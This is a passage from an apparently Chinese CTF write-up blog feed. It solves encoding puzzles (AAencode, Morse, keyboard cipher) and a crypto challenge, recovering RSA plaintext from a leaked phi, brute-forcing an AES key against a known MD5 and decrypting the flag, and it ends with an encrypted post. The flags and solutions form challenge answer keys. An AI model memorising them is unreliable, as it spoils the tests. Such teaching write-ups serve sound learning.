(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span></span><br></pre></td></tr></table></figure><h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3>   <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.--</span> -<span class="string">..</span> <span class="string">.-.</span> -<span class="string">....-</span> -<span class="string">...</span> <span class="string">....</span> -- -<span class="string">....-</span> -. -<span class="string">.-</span> <span class="string">..-</span> <span class="string">....</span> -<span class="string">....-</span> <span class="string">..</span> <span class="string">.-..</span> <span class="string">.--.</span> -<span class="string">....-</span> - <span class="string">....</span> <span class="string">..-</span> -<span class="string">....-</span> - <span class="string">....</span> <span class="string">..-</span> -<span class="string">....-</span> <span class="string">.-..</span> --<span class="string">..--.-</span> <span class="string">.--.</span> -<span class="string">....-</span> -<span class="string">.--</span> <span class="string">.---</span> <span class="string">..</span> -<span class="string">....-</span> . <span class="string">..-.</span> - -<span class="string">....-</span> <span class="string">.-</span> -<span class="string">..-</span> -<span class="string">..</span> <span class="string">.--</span> -<span class="string">....-</span> <span class="string">.--</span> <span class="string">...</span> <span class="string">.-.</span> -<span class="string">....-</span> <span class="string">.--.</span> <span class="params">---</span> -<span class="string">.-</span> -<span class="string">....-</span> -<span class="string">..</span> -<span class="string">.-.</span> --. <span class="string">.-.</span>;</span><br></pre></td></tr></table></figure><h3 id="morse"><a href="#morse" class="headerlink" title="morse"></a>morse</h3><p>   <code>.--/-../.-./-....-/-.../..../--/-....-/-./-.-/..-/..../-....-/../.-../.--./-....-/-/..../..-/-....-/-/..../..-/-....-/.-../--..--.-/.--./-....-/-.--/.---/../-....-/./..-./-/-....-/.-/-..-/-../.--/-....-/.--/.../.-./-....-/.--./---/-.-/-....-/-../-.-./--./.-.</code></p>   <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WDR</span>-BHM-NKUH-ILP-THU-THU-L%ucdP-YJI-EFT-AXDW-WSR-POK-DCGR</span><br></pre></td></tr></table></figure><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p>   <code>r00t&#123;enjoy_yourself&#125;</code> or <code>r00t&#123;ENJOY_YOURSELF&#125;</code></p><h2 id="跨越世纪的密码学"><a href="#跨越世纪的密码学" class="headerlink" title="跨越世纪的密码学"></a>跨越世纪的密码学</h2><blockquote><p>密码学是一门研究加密和解密的学科，是数学和计算机科学的分支，具有广泛的应用性。70年前，香农发表了《保密系统和通信理论》，为密码系统建立了理论基础，从此密码学成为一门学科。从中世纪战争使用的古典密码学到近代用于加密认证的现代密码学，密码学跨越了几个世纪，造福一代又一代的人。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flagenc <span class="keyword">import</span> flag_e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_enc</span>(<span class="params">m</span>):</span></span><br><span class="line">    p = getPrime(<span class="number">2048</span>)</span><br><span class="line">    q = getPrime(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = <span class="number">65535</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> c,n,phi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = bytes_to_long(flag_e.encode())</span><br><span class="line">    c,n,phi = rsa_enc(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n:&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c:&quot;</span>,c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;phi:&quot;</span>,phi)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#n=867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565332659159017315830404108112573513422514092211961809397683826860955333907492076319697683873070988203533060172226299654640431372636664212890855901106009335408904168663444062395560923280893905574621349215890287022016634315310170201933483641286343232522486854219001353298681437247810130313463294469449829433938014276089581871069130799778570050071269974901888486341414636683400249073904645454444221128885705910670862174811188058907878240460286507231250059471859162034722561368270784238102430157809160745418630702375154475602643880513301644310519285011767707528037046886574977679327586544694372164176809557853155542871095253</span></span><br><span class="line"><span class="comment">#c=391697005929552889899624830215124682575267078889079201072133494095145759579046066347252915001923189313973278571826223859645184908706427072190715810096762282243880619637348016497361444041933947882850250418927379704657622278598816689855084883059158337921836786317565166049871100026006393993288893058936739439738022130124099305108140743259731160066564274872151968129045918085079143799107277739464655582585781071099212520363988493913082922866099403377300673366747825256467038243192399767164076685852234653970502846413632195424760038541958148380660429785487390583553120274885240552255285089606977744941886013772747881926208782099692077427795179462019605178557106459296546975237531251622042718424305286207681047331067563366960995950636061474397803323838669834764420996419209392870582956326172388319536169644790216185451519917476555609250782848706670945702170334385909547448130814462907972601574007677975767368742231704088242374802664674914635640557841912213450212858885643646516543254448927591662502002704405591678642934442843031804623559824142416740069180900533516164725769842816713265524045088835470803505780159404892637737146146489585446452325219790835092436936741277597038779688278316092540356696242286837477820043838990654446689758405</span></span><br><span class="line"><span class="comment">#phi=867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565273711064097635722624828303228560977280604283312275720472893738908340485615199442472241554366592725905561371790414263688546266940109530780916523535916653049978164944441237790588358454981712188848464526040048848867904939345772067113042277048544521709018387414016554452106447169079353564720720933763588687864105154485920469108666959519751145013048856811573769466659173292069248737253417982792923468757575784464619482225159866464340115984115915768033859486388780434401618224707697523974328704810085445202274804749169121510267897644783956768255707509767680678009026141447435902688170793766234897120468408039285910787786528</span></span><br></pre></td></tr></table></figure><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n=<span class="number">867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565332659159017315830404108112573513422514092211961809397683826860955333907492076319697683873070988203533060172226299654640431372636664212890855901106009335408904168663444062395560923280893905574621349215890287022016634315310170201933483641286343232522486854219001353298681437247810130313463294469449829433938014276089581871069130799778570050071269974901888486341414636683400249073904645454444221128885705910670862174811188058907878240460286507231250059471859162034722561368270784238102430157809160745418630702375154475602643880513301644310519285011767707528037046886574977679327586544694372164176809557853155542871095253</span></span><br><span class="line">c=<span class="number">391697005929552889899624830215124682575267078889079201072133494095145759579046066347252915001923189313973278571826223859645184908706427072190715810096762282243880619637348016497361444041933947882850250418927379704657622278598816689855084883059158337921836786317565166049871100026006393993288893058936739439738022130124099305108140743259731160066564274872151968129045918085079143799107277739464655582585781071099212520363988493913082922866099403377300673366747825256467038243192399767164076685852234653970502846413632195424760038541958148380660429785487390583553120274885240552255285089606977744941886013772747881926208782099692077427795179462019605178557106459296546975237531251622042718424305286207681047331067563366960995950636061474397803323838669834764420996419209392870582956326172388319536169644790216185451519917476555609250782848706670945702170334385909547448130814462907972601574007677975767368742231704088242374802664674914635640557841912213450212858885643646516543254448927591662502002704405591678642934442843031804623559824142416740069180900533516164725769842816713265524045088835470803505780159404892637737146146489585446452325219790835092436936741277597038779688278316092540356696242286837477820043838990654446689758405</span></span><br><span class="line">phi=<span class="number">867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565273711064097635722624828303228560977280604283312275720472893738908340485615199442472241554366592725905561371790414263688546266940109530780916523535916653049978164944441237790588358454981712188848464526040048848867904939345772067113042277048544521709018387414016554452106447169079353564720720933763588687864105154485920469108666959519751145013048856811573769466659173292069248737253417982792923468757575784464619482225159866464340115984115915768033859486388780434401618224707697523974328704810085445202274804749169121510267897644783956768255707509767680678009026141447435902688170793766234897120468408039285910787786528</span></span><br><span class="line">e = <span class="number">65535</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ciphertext: 3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58</span></span><br><span class="line"><span class="string">Encrypt Method: AES</span></span><br><span class="line"><span class="string">Key: 1732050807ª»ÌÝîÿ</span></span><br><span class="line"><span class="string">IV: 0000000000000000</span></span><br><span class="line"><span class="string">Mode: ¥¶Ç</span></span><br><span class="line"><span class="string">Notice: key is 16-digits numeric character.</span></span><br><span class="line"><span class="string">key&#x27;s md5: 2116f08e96a6f9090e90c13bd28a3d15</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="md5爆破key"><a href="#md5爆破key" class="headerlink" title="md5爆破key"></a>md5爆破key</h3>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> itertools import product</span><br><span class="line"><span class="attribute">import</span> hashlib</span><br><span class="line"><span class="attribute">table</span> =<span class="meta"> [chr(i) for i in range(48, 58)]</span></span><br><span class="line"><span class="attribute">for</span> i in product(table, repeat=<span class="number">6</span>):</span><br><span class="line">    <span class="attribute">i</span> = &#x27;&#x27;.join(list(i)).encode()</span><br><span class="line">    <span class="attribute">i</span> = b&#x27;<span class="number">1732050807</span>&#x27; + i</span><br><span class="line">    <span class="attribute">m</span> = hashlib.md<span class="number">5</span>()</span><br><span class="line">    <span class="attribute">m</span>.update(i)</span><br><span class="line">    <span class="attribute">print</span>(i)</span><br><span class="line">    <span class="attribute">des</span> = m.hexdigest()</span><br><span class="line">    <span class="attribute">if</span> &#x27;<span class="number">2116</span>f<span class="number">08</span>e<span class="number">96</span>a<span class="number">6</span>f<span class="number">9090</span>e<span class="number">90</span>c<span class="number">13</span>bd<span class="number">28</span>a<span class="number">3</span>d<span class="number">15</span>&#x27; == des:</span><br><span class="line">        <span class="attribute">print</span>(i)</span><br><span class="line">        <span class="attribute">print</span>(&#x27;key!&#x27;)</span><br><span class="line">        <span class="attribute">sys</span>.exit()</span><br><span class="line">        <span class="comment"># 1732050807902831</span></span><br></pre></td></tr></table></figure><h3 id="AES解密（除了ECB外挨个把模式试一遍）"><a href="#AES解密（除了ECB外挨个把模式试一遍）" class="headerlink" title="AES解密（除了ECB外挨个把模式试一遍）"></a>AES解密（除了ECB外挨个把模式试一遍）</h3>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">iv = <span class="string">b&#x27;0000000000000000&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;1732050807902831&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58&#x27;</span></span><br><span class="line">c = base64.b16decode(c.upper()) <span class="comment"># 十六进制转字符</span></span><br><span class="line">flag = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">flag = flag.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;r00t&#123;a_small_step_on_cryptography_one_giant_leap_for_mankind&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Checkin</title>
      <link href="/2022/05/19/checkin/"/>
      <url>/2022/05/19/checkin/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="40c769c6db0977f0276555aa6ad066f2a3a204c76c38560cfb1c1db0dec6a01c">573c1756365396c60292f417431663bda20b4a8eb8e7ec16df38f87fb3346cef0752e62d7df33379ea4bc551e4a29ebeb005af37923108e40b9b10c67450560adaa28ecbb09ec7c0bff2ecdb194806ce6ff1471c960f692e5322d1fc7f8765ccbb061326d0151b3e1d40986b25b083c549ffdb0175564b4c9549f186e6eed21886c5d1e0a32490d11fed5171b309465aeab8b665b7f7e474d7b3738a2cdbde938a5411acba17007d88d0417d6d3b5ca217fe4b7ebae26355546779fe9d143169caae6e154db279681384368467a38aa381592d38c8a12b19bcf7174d3680bd75c4452fb6bb187f1bae7a8cbe110d1ed84e5064b2f575437258fb6e86d10853097527cb5c0f44e29f806ff3fa3ec983aeb6955f67b6a04b8e92723e491b965f6d5807e33880008447db46228460f44de7d2bf2edfac783fa8c05c661577867d8ef70273d15e458e47ab1ba75c83636a6bad120d83b92247c291e7e26dd89357b87423a7acdb0309d745bc0c81bd423586d9b5fd9ea782c59673da704f6c587de4f6e04986bce0a11209075d42cf8f35a83e25c7e6221cbc1aca713172687b89f6e776eee35eb43fb562c36646c2b90ad6718d2b007d04539d8a9d3d346f90b6b9da17c8aed6057dc3a45f24590d0f620bc229b7c9c914e2a5be15d929988674cf5ec6e4a6e9cd64f2a08d3526637db4b94bfb1bf216aecd8b0859df85c9a38d35c5b1d967669050bc55b0efe149de5b06e507d229ad42711b8b911ebfa59f78e5f5cbc8ec302126c3e76220f7586cb7c2fd2a41e135809b96ae49bf101b52996c74090e7053a45c38eb15f7c17883af3b2e641e2a493cd162c1c6940f929f7f953f0ab4661962d2f75356f6f7b12002823c6a838833300cf9a83c13de57a2362f5c9188dac869fc556627f29f26c7571d5589cb1e18fbbba3791f935402e30a31b8403be8687793fafcae0a9637512b830372a49dafdc2ced1f29730e9a4042d84646253b632871650f5f671e671aae7d81bcf435ce8795cf5491785e0746470c7a0770c7ecaf0a26d24e815e67edfeb46fce26c1644c73dd35239d66621b0db166a46d6ad28680102492b1817293df56abc9db072eb6784d235b208a823bf1d3c4c365a47f44cad97dc8f20413a4b88912e1ec0cb19652a5068b863a943e7368a10ce8d093e20da6e334393c3677e58dfa0ece3c6f6e50ee8562a276fed1e39f7b13f1cfb60d81f3e0b42dfacc794e994a0471136374e3f102f8555b8583f2b6988adc353f4f5a46c8300700000477780f7307981cf3aa729e2af534e0ebe6d2e2b3a94a32f466f3dd82cf884714f3aa5c98afa1aeb927e9226c60dd15f68d50e73dea30ffe3a3269c307d5928d59701b0ec729727bf74bdac459745751dca6e33011a78fe6020a3998a2ef2d6d04513567de7aabbe3be6ac9bb75cc8fec7b53c42a7dadd1922d4728b0828d73394c13bb1de1ff443bc4e4ecbfc8e4afc6845e99d5c59ec739324423d06a612e74202437c5f5873d6afbe8c3e498b51265e54393697d1c3e260cbc109ff383b69b3895492ddc6419f875e4c2afcb1b634c937aa2ed63b4551bdbf842f0548fa1ebeb0ab6c3a8ff67015b0e4e26654b938e4a881b6e3a19006f43378dd66b2366aeb23873e95a147dab7b07938662afbbeb1e6c509da0aafef37d4be0bdbc2136b83fa9e9a82c427cc69af3766607b5e52e6aa16d93e07d70a1502fa8ab915dcd18014c1a653501bc0453ff90097f12fd52ee2a49827736c219bac1ecab3015adac5f3af4f2dc4b97cf6cc879c60bb38fb22e6349f97be2cfd2148535d28b0c7e37587c15c82f1776f8eaa1531231fafcd7fae61835c646320efd243d22d591a09edfd9ffa8b413e40531d20817ac557afb026e3a42a5d26fdee4d6666392691a5c24774abd7ef50a4a8681b4da410e7e99a06c63d4e2657646ac1b135248becf904cd64405dbaf35da0f556951543d2218ff3560ee0bdb5f0e75becbd34803de66467e6c64b4ceea1096aac3d28cf20bb9dd631f1d36829bf2c223622916b35b7ee1c0c2f5c8dfb477c6ebfc44265fe5dcd8f8bcdf4f72597440b16bdd71fc71c24d67cff22acf794d3c31d9c0ac44498ec2b3a7af06a503964b8289427b7bdd796f1582a19a656009a8a01e94e95a3a303bbd4d8661617414da395a5506b8fa5cbcb0f49cb15b6463407cac64e4161772d537a3b31c5a53c8c5c6e24878f90c17bddf3aa3606438133ca5453c0abeb189d3c95792d1f2efd26c3e08a8055848fe993ea90bc2002c45051e9b1ea93bd686754d4156179a8837c57c020f8c9db3ce34bac9d6c18f3b124643d072ad7439150b386f562bb73d05d36a0f423be35d702709f75b23e5ea0e177e1ffaaa321bf47d4b40541239c35aac7f29a6716063bb342fdca9c6e079162a329a08fb3b1cfaf8d62195f19fab8aaaa18c1a8e1f1fa7ad1a27d456e5110051c047f5b1a85dbd2263919935ccc88a5662e295b1e500bf99a20b08aee82aa4c665bf6802d02039f05470593449243f7e008bbd16b554de7fd1ce9ff64a811dc01625de9cd20acb14dfa5c3741e361e27a8bfad7b8363302e4356d69b7dfa8194ff8f7fa3ff224485f0fc3e54573b31b05d2b569dd331efffd6e5a055f74e8d0df40afa9e62b3e41958a334f0b52c17a56b7e8c1b66f97762fa4df7e483d5189a5dd2cd4c4c849db271704731ce989864f6269820098047f3afa9cacf59cee3884250851eb81524ea754d5f4416f1d14aac980d4eb545c8804734bd35ee2132fb4de4fd11abad6bbc52c6f28ff8f3b56362358d2ef1b0da82325894a60837f9622afc6b60a51798473473294f1207ff65fa356c4971035b3160230e18df7e0e7952deea8d467329f7eb9752feaf88d6bf90af1676e7c1a9606c0400c6a521a2c94b4e27d994f5f842d5126f7f944f0afcb5975e37c96ff526a5eafca678ade497919834fefb870eca469aaa0b17e412cd6dc544442e736034836a578a0a3e44a8efe4f119329c323ae14eaa7cde8423bbe570a99196d806f1ae01fd35effc0d86ae61d14cc2a6b3f4635389aa6b9655810c85a49379af69031d89dfc6e6d80a694f4e9d71e679174cfdddb0f1256533a94aed2718241334b915171e20f830e23956975ee9b88c77a3d942c38f8cfabae4c85c848867d4e049e58b962ff4a8fa4e31f8e2eb0ede76dac8a43e36ba84a6f8beabc6eff5b5c501489e5d98ab070bb89fb2570b74234cf284b95fe8d23dcaf02324e